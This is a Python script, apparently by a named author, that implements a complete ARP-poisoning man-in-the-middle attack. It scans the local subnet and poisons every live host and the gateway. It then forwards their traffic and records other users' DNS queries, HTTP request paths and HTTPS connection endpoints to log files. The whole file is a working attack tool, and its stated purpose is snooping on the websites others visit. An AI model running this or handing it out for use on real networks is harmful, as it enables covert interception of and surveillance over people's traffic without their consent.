#!/usr/bin/env python3
'''
Author: Chris Quinn
Title: ARP Poisoner
Description: Scans user's subnet, poisons all live hosts, forwards traffic between host and gateway, and captures unencrypted DNS and HTTP traffic to snoop on websites others are visiting.
'''
import ipaddress
import netifaces
from scapy.all import ARP, Ether, IP, DNS, srp, sendp, sniff
from scapy.layers.http import HTTPRequest
import time
import threading
import sys
import os
from datetime import datetime

class ARPPoisoner:
   def __init__(self):
       self.subnet = None
       self.live_hosts = []
       self.attacker_mac = None
       self.attacker_ipv4 = None
       self.gateway_ip = None 
       self.gateway_mac = None
       self.stop_flag = threading.Event()
       
       # Create one filename for each type at start of run
       timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
       self.dns_file = f'dns_queries_{timestamp}.txt'
       self.http_file = f'http_queries_{timestamp}.txt'
       self.https_file = f'https_queries_{timestamp}.txt'
       self.host_thread = None
       self.gateway_thread = None

   def discover_subnet(self):
       iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
       addresses = netifaces.ifaddresses(iface)
       ipv4_address = addresses[netifaces.AF_INET][0]['addr']
       subnet_mask = addresses[netifaces.AF_INET][0]['netmask']
       self.subnet = ipaddress.ip_network(f"{ipv4_address}/{subnet_mask}", strict=False)
       print(f"Subnet: {self.subnet}")

   def scan_subnet(self):
       print("Starting ARP sweep...")
       try:
           answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(self.subnet), op=1), timeout=5, verbose=False)
           for sent, received in answered:
               if received.psrc != self.attacker_ipv4:
                   self.live_hosts.append((received.psrc, received.hwsrc))
                   print(f"Live Host Found. IP: {received.psrc}    MAC: {received.hwsrc}")
       except Exception as e:
           print(f"Error during ARP sweep: {e}")

   def discover_attacker_info(self):
       default_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
       addresses = netifaces.ifaddresses(default_iface)
       
       if netifaces.AF_LINK in addresses:
           self.attacker_mac = addresses[netifaces.AF_LINK][0]['addr']
       if netifaces.AF_INET in addresses:
           self.attacker_ipv4 = addresses[netifaces.AF_INET][0]['addr']
       print(f"Attacker Info - Interface: {default_iface}, IP: {self.attacker_ipv4}, MAC: {self.attacker_mac}")

   def discover_gateway(self):
       gateway_info = netifaces.gateways()
       if 'default' in gateway_info and netifaces.AF_INET in gateway_info['default']:
           self.gateway_ip = gateway_info['default'][netifaces.AF_INET][0]
           self.gateway_mac = next((mac for ip, mac in self.live_hosts if ip == self.gateway_ip), None)
           if not self.gateway_mac:
               raise ValueError(f"Gateway IP {self.gateway_ip} found but MAC address not discovered.")
           print(f"Gateway Info - IP: {self.gateway_ip}, MAC: {self.gateway_mac}")
       else:
           raise ValueError("No default gateway found.")

   def poison_hosts(self, interval=2):
       print(f"Starting host poisoning for {len(self.live_hosts)} hosts...")
       try:
           while not self.stop_flag.is_set():
               for ip, mac in self.live_hosts:
                   if ip != self.gateway_ip:
                       sendp(Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.attacker_mac))
               time.sleep(interval)
       except KeyboardInterrupt:
           print("\nHost poisoning stopped.")

   def poison_gateway(self, interval=2):
       print("Starting gateway poisoning...")
       try:
           while not self.stop_flag.is_set():
               for ip, mac in self.live_hosts:
                   if ip != self.gateway_ip:
                       sendp(Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=self.attacker_mac))
               time.sleep(interval)
       except KeyboardInterrupt:
           print("\nGateway poisoning stopped.")

   def process_packet(self, packet):
       if not IP in packet:
           return
           
       src_ip = packet[IP].src
       dst_ip = packet[IP].dst
       
       # Filter out attacker traffic
       if src_ip == self.attacker_ipv4 or dst_ip == self.attacker_ipv4:
           return

       # Forward traffic
       if dst_ip == self.gateway_ip:
           new_packet = Ether(dst=self.gateway_mac, src=self.attacker_mac)/packet[IP]
           sendp(new_packet, verbose=False)
       elif src_ip == self.gateway_ip:
           target_mac = next((mac for ip, mac in self.live_hosts if ip == dst_ip), None)
           if target_mac:
               new_packet = Ether(dst=target_mac, src=self.attacker_mac)/packet[IP]
               sendp(new_packet, verbose=False)

       # Log HTTPS traffic
       if 'dport' in packet[IP] and packet[IP].dport == 443:
           entry_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
           print(f"[+] HTTPS: {src_ip} -> {dst_ip}")
           with open(self.https_file, 'a') as file:
               file.write(f"{entry_timestamp}: HTTPS connection from {src_ip} to {dst_ip}\n\n")

       # Capture DNS queries
       if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
           query = packet[DNS].qd.qname.decode('utf-8')
           entry_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
           print(f"[+] DNS Query: {src_ip} -> {query}")
           with open(self.dns_file, 'a') as file:
               file.write(f"{entry_timestamp}: {src_ip} queried {query}\n")

       # Capture HTTP requests
       if packet.haslayer(HTTPRequest):
           try:
               host = packet[HTTPRequest].Host.decode('utf-8')
               method = packet[HTTPRequest].Method.decode('utf-8')
               path = packet[HTTPRequest].Path.decode('utf-8')
               entry_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
               print(f"[+] HTTP {method}: {src_ip} -> {host}{path}")
               with open(self.http_file, 'a') as file:
                   file.write(f"{entry_timestamp}: {src_ip} -> {dst_ip}\n")
                   file.write(f"{method} {path} {packet[HTTPRequest].Version}\n")
                   file.write(f"Host: {host}\n\n")
           except Exception as e:
               print(f"Error processing HTTP packet: {e}")

   def start_mitm_attack(self):
       print("Starting Man in the Middle Attack and packet capture...")
       print("Press Ctrl+C to stop...")
       filter_expr = '(tcp port 80) or (tcp port 443) or (udp port 53)'
       try:
           sniff(filter=filter_expr, prn=self.process_packet, store=False)
       except KeyboardInterrupt:
           raise

   def restore_arp_tables(self):
       print("Restoring ARP tables")
       for ip, mac in self.live_hosts:
           if ip != self.gateway_ip:
               sendp(Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac))
               sendp(Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=mac))

   def setup(self):
       os.system('sysctl -w net.ipv4.ip_forward=1')
       self.discover_attacker_info()
       self.discover_subnet()
       self.scan_subnet()
       self.discover_gateway()

   def start_attack(self):
       self.host_thread = threading.Thread(target=self.poison_hosts)
       self.gateway_thread = threading.Thread(target=self.poison_gateway)
       self.host_thread.start()
       self.gateway_thread.start()
       self.start_mitm_attack()

   def cleanup(self):
       self.stop_flag.set()
       self.restore_arp_tables()
       if self.host_thread:
           self.host_thread.join(timeout=2)
       if self.gateway_thread:
           self.gateway_thread.join(timeout=2)

   def run(self):
       try:
           self.setup()
           self.start_attack()
       except KeyboardInterrupt:
           print("\nReceived interrupt, cleaning up...")
           self.cleanup()
           sys.exit(0)

if __name__ == "__main__":
   poisoner = ARPPoisoner()
   poisoner.run()